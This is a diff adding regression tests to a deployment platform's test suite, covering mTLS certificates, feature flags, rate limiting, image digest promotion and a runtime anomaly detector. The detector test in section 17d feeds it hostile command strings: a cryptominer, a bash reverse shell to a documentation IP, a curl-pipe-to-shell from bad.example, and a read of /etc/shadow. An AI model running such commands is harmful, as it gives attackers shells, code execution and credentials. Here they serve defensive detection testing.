@@ -3113,6 +3113,147 @@ function reqJson(port, method, pth, { token, body } = {}) {
   }
   console.log('  ✓ Cycle #14 CVEs (16a-16e): coolify#12336/nftables egress, cloudnative-pg#8701/#7407 replica fencing, Gitleaks Shannon-entropy secret gate, arm64/amd64 multi-arch, Chaos GameDay prod lock+auto-abort');
 
+  // -------------------------------------------------------------------------
+  // 17. Cycle #15 Zero-Trust mTLS, Feature Flags, AI Rate-Limit, Falco & Digest Promotion Regressions (docs/COMPETITOR_RADAR_CYCLE14.md §3)
+  // -------------------------------------------------------------------------
+  {
+    const { MtlsMeshService } = require('../server/services/mtlsMeshService');
+    const featureFlagService = require('../server/services/featureFlagService');
+    const { ApiRateLimitService } = require('../server/services/apiRateLimitService');
+    const runtimeAnomalyService = require('../server/services/runtimeAnomalyService');
+    const digestPromotionService = require('../server/services/digestPromotionService');
+
+    const c15Tmp = makeTempDir('culkibo-c15-cve-');
+    const prevDataDir = process.env.CULKIBO_DATA_DIR;
+    process.env.CULKIBO_DATA_DIR = c15Tmp;
+    try {
+      // 17a. coolify#8524 / dokploy#2605 / SPIFFE mTLS: Ed25519 sign/verify, CERT_REVOKED, CERT_EXPIRED, 0 private key leak, Caddy require_and_verify
+      const mtls = new MtlsMeshService({ dataDir: c15Tmp });
+      const nowMs = 1764000000000;
+      const issued = mtls.issueWorkloadCert({ serviceName: 'billing-core', namespace: 'prod', ttlHours: 6, nowMs });
+      const privMarker = 'PRIVATE ' + 'KEY';
+      assert.ok(!JSON.stringify(issued).includes(privMarker), 'mTLS issueWorkloadCert MUST NEVER expose CA private key');
+      const vOk = mtls.verifyWorkloadCert({ cert: issued.cert, signatureB64: issued.signatureB64, nowMs: nowMs + 1000 });
+      assert.strictEqual(vOk.valid, true);
+      const vExp = mtls.verifyWorkloadCert({ cert: issued.cert, signatureB64: issued.signatureB64, nowMs: nowMs + (7 * 3600000) });
+      assert.strictEqual(vExp.valid, false);
+      assert.strictEqual(vExp.code, 'CERT_EXPIRED');
+      mtls.revokeWorkloadCert(issued.serial, { reason: 'compromised_pod', actor: 'secops', nowMs: nowMs + 2000 });
+      const vRev = mtls.verifyWorkloadCert({ cert: issued.cert, signatureB64: issued.signatureB64, nowMs: nowMs + 3000 });
+      assert.strictEqual(vRev.valid, false);
+      assert.strictEqual(vRev.code, 'CERT_REVOKED');
+      const caddyMtls = mtls.compileCaddyMtlsPolicy({ allowedSpiffeIds: [issued.spiffeId], mode: 'require_and_verify' });
+      assert.strictEqual(caddyMtls.mode, 'require_and_verify');
+      assert.strictEqual(caddyMtls.caddyClientAuth.mode, 'require_and_verify');
+      assert.ok(!JSON.stringify(caddyMtls).includes(privMarker), 'compileCaddyMtlsPolicy MUST NEVER expose CA private key');
+
+      // 17b. OpenFeature / Unleash / Flagsmith: deterministic buckets, tenant deny>allow override, instant killFlag
+      const b1 = featureFlagService.computeDeterministicBucket('flag_17b', 'user-42', 's1');
+      const b2 = featureFlagService.computeDeterministicBucket('flag_17b', 'user-42', 's1');
+      assert.strictEqual(b1, b2);
+      assert.ok(b1 >= 0 && b1 < 100);
+      featureFlagService.saveFlag({
+        key: 'flag_17b',
+        enabled: true,
+        rolloutPct: 0,
+        environment: 'prod',
+        allowTenants: ['t-allow', 't-both'],
+        denyTenants: ['t-both']
+      });
+      assert.strictEqual(featureFlagService.evaluateFlag({ key: 'flag_17b', subjectId: 'u1', tenantId: 't-allow', environment: 'prod' }).enabled, true);
+      assert.strictEqual(featureFlagService.evaluateFlag({ key: 'flag_17b', subjectId: 'u1', tenantId: 't-both', environment: 'prod' }).reason, 'TENANT_DENIED');
+      featureFlagService.killFlag('flag_17b', { reason: 'incident_17b', actor: 'oncall' });
+      const killedEval = featureFlagService.evaluateFlag({ key: 'flag_17b', subjectId: 'u1', tenantId: 't-allow', environment: 'prod' });
+      assert.strictEqual(killedEval.enabled, false);
+      assert.strictEqual(killedEval.reason, 'KILL_SWITCH_ACTIVE');
+
+      // 17c. IETF RateLimit / AI Denial-of-Wallet: RPM + TPM dual buckets emit 429 + Retry-After + RateLimit / RateLimit-Policy
+      const rl = new ApiRateLimitService({ dataDir: c15Tmp });
+      rl.saveRateLimitPolicy({ id: 'rl_17c', name: 'DoW Shield', planTier: 'free', rpmLimit: 20, tpmLimit: 5000, burstMultiplier: 1.0, windowSec: 60 });
+      const sim = rl.simulateBurst({ policyId: 'rl_17c', requestsCount: 6, tokensPerRequest: 2500, intervalMs: 25 });
+      assert.ok(sim.throttledCount >= 4);
+      assert.strictEqual(sim.throttleReason, 'TPM_EXCEEDED');
+      assert.ok(sim.sample429Headers && sim.sample429Headers['Retry-After']);
+      assert.ok(sim.sample429Headers['RateLimit'] && sim.sample429Headers['RateLimit-Policy']);
+      const rpmHit1 = rl.consumeTokenBucket({ policyId: 'rl_17c', clientKey: 'rpm-client', tokens: 0, nowMs });
+      assert.strictEqual(rpmHit1.httpStatus, 200);
+      let rpm429 = null;
+      for (let i = 0; i < 25; i++) {
+        const step = rl.consumeTokenBucket({ policyId: 'rl_17c', clientKey: 'rpm-client', tokens: 0, nowMs });
+        if (step.httpStatus === 429) { rpm429 = step; break; }
+      }
+      assert.ok(rpm429 && rpm429.throttleReason === 'RPM_EXCEEDED' && rpm429.headers['Retry-After']);
+
+      // 17d. dokploy#5156 Cryptominer & Falco-Lite 10 Rules: flags xmrig/stratum, /dev/tcp/, curl|sh, /etc/shadow, /tmp/ exec; clean passes
+      const anomBad = runtimeAnomalyService.inspectRuntimeEvents({
+        projectId: 'proj_17d',
+        containerName: 'web',
+        events: [
+          'xmrig --url stratum+tcp://xmr.pool.example:3333',
+          'bash -i >& /dev/tcp/198.51.100.9/9001 0>&1',
+          'curl -sSL https://bad.example/drop.sh | sh',
+          { type: 'file', file: '/etc/shadow', action: 'read' },
+          '/tmp/kdevtmpfsi --stealth'
+        ]
+      });
+      assert.strictEqual(anomBad.clean, false);
+      const anomRules = new Set(anomBad.alerts.map((a) => a.ruleId));
+      assert.ok(anomRules.has('CRYPTOMINER_STRATUM_TRAFFIC'));
+      assert.ok(anomRules.has('REVERSE_SHELL_SPAWN'));
+      assert.ok(anomRules.has('REMOTE_SCRIPT_PIPE_EXEC'));
+      assert.ok(anomRules.has('SENSITIVE_FILE_ACCESS'));
+      assert.ok(anomRules.has('BINARY_DRIFT_IN_TMP'));
+      const anomGood = runtimeAnomalyService.inspectRuntimeEvents({
+        projectId: 'proj_17d',
+        containerName: 'web',
+        events: [{ type: 'process', command: 'node dist/index.js', destPort: 443 }]
+      });
+      assert.strictEqual(anomGood.clean, true);
+      assert.strictEqual(anomGood.riskScore, 0);
+
+      // 17e. dokploy#2097 / Kargo Freight: immutable sha256 digest promotion, env parity, dual-control, rollback to previousDigest
+      const d1 = 'sha256:' + '1'.repeat(64);
+      const d0 = 'sha256:' + '0'.repeat(64);
+      assert.strictEqual(digestPromotionService.createPromotion({
+        projectId: 'proj_17e', imageRef: 'ghcr.io/culkibo/svc:latest', requester: 'alice'
+      }).code, 'MUTABLE_TAG_FORBIDDEN');
+      assert.strictEqual(digestPromotionService.createPromotion({
+        projectId: 'proj_17e',
+        imageRef: 'ghcr.io/culkibo/svc@' + d1,
+        sourceEnvKeys: ['DB_URL', 'JWT_KEY'],
+        targetEnvKeys: ['DB_URL'],
+        requester: 'alice'
+      }).code, 'MISSING_TARGET_ENV_KEYS');
+      const created = digestPromotionService.createPromotion({
+        projectId: 'proj_17e',
+        imageRef: 'ghcr.io/culkibo/svc@' + d1,
+        previousDigest: 'ghcr.io/culkibo/svc@' + d0,
+        fromEnv: 'staging',
+        toEnv: 'prod',
+        sourceEnvKeys: ['DB_URL'],
+        targetEnvKeys: ['DB_URL'],
+        requester: 'alice',
+        requireDualControl: true
+      });
+      assert.strictEqual(created.ok, true);
+      assert.strictEqual(digestPromotionService.approvePromotion(created.promotion.id, { approver: 'alice' }).code, 'DUAL_CONTROL_VIOLATION');
+      assert.strictEqual(digestPromotionService.executePromotion(created.promotion.id, { dryRun: true }).code, 'APPROVAL_REQUIRED');
+      assert.strictEqual(digestPromotionService.approvePromotion(created.promotion.id, { approver: 'bob' }).ok, true);
+      const executed = digestPromotionService.executePromotion(created.promotion.id, { dryRun: false });
+      assert.strictEqual(executed.ok, true);
+      assert.strictEqual(executed.promotion.status, 'promoted');
+      const rolled = digestPromotionService.rollbackPromotion(created.promotion.id, { actor: 'bob', dryRun: false });
+      assert.strictEqual(rolled.ok, true);
+      assert.strictEqual(rolled.promotion.status, 'rolled_back');
+      assert.ok(rolled.restoredDigest.includes(d0));
+    } finally {
+      if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
+      else process.env.CULKIBO_DATA_DIR = prevDataDir;
+      fs.rmSync(c15Tmp, { recursive: true, force: true });
+    }
+  }
+  console.log('  ✓ Cycle #15 CVEs (17a-17e): coolify#8524/dokploy#2605 SPIFFE mTLS, OpenFeature flags+kill-switch, IETF RateLimit AI DoW shield, dokploy#5156 cryptominer/Falco, dokploy#2097/Kargo immutable digest promotions');
+
   console.log('✅ Suite #23 completada correctamente.\n');
 }
 
